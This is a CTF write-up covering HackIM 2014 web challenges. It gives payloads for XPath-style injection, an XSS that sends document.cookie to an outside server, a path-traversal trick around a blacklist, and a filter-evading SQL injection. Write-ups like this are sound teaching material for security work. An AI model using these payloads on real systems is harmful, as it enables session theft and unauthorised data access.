---
layout: post
ctf: "HackIM 2014"
title: "Web track (1 to 6)"
author: "Mathieu Binette"
---

##Web 1 - 100pts

In this challenge, you have two pages: a login page and a register page.

After looking at the HTML code of both pages, we noticed a comment `<!-- <user>isAdmin=No</user> -->`. It is now pretty clear that we are facing a XPATH injection challenge. After trying a couple of variant of the `ìsAdmin` tag, we finally found the way to inject the admin parameter by registering `user</username><isAdmin>Yes</isAdmin><username>user`.

That's it for this challenge.

* * *

##Web 2 - 200pts

On this challenge, you need to choose a user and then you can send search queries to a log file that will "be consulted by an admin". This sounds a lot like XSS, and this is exactly what it is. However, there is a small filtered blacklist:

```
document.cookie
document.location
onerror
```

However, you can get around this by doing:

```
<script>
    document['location'] = 'http://myserver.ms/file.php?q='+document['cookie']
</script>
```

Which effectively gives you the flag for this level.

* * *

##Web 3 - 200pts

Writeup coming soon.

* * *

##Web 4 - 200pts

Writeup coming soon.

* * *

##Web 5 - 500pts

Before the first page even loads, you know you're facing a LFI challenge when you see `/index.php?page=home`.

When looking at the comments on the HTML file, you see that the flag is hidden in `etc/flag`.

However, there are a couple of blacklisted characters/words.

```
..
passwd
etc/flag
```

You get the flag by requesting `etc/./flag`.

* * *

##Web 6 - 600pts

This is just a basic SQL injection challenge. After trying `-1 or 1=1` and getting a "Attack detected" message, you find out there are a couple of filters. Here are the following blacklisted words/characters we found:

```
 (space)
or
=
'
SELECT
```

Even with this blacklist, it is still quite easy to inject the following `-1/**/||/**/1/**/like/**/1`.

And you get the flag.
